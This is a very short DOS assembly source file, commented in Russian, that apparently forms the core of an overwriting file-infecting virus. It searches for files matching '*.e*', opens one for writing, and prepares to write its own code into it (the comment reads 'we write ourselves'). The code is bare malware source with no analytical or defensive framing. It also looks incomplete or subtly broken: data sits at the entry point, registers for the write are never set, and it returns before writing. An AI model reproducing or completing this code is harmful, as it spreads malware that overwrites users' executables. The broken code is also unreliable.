       .model tiny
       .code
       org  100h
start:
maska  db   '*.e*'
       mov  ah,4eh       ; ищем
       call new
new:
       mov  dx,si
       int  21h

       mov  ax,3D01h     ; открываем
       mov  dx,9eh
       int  21h

       xchg bx,ax
       mov  ah,40h       ; пишемся
       ret

end start
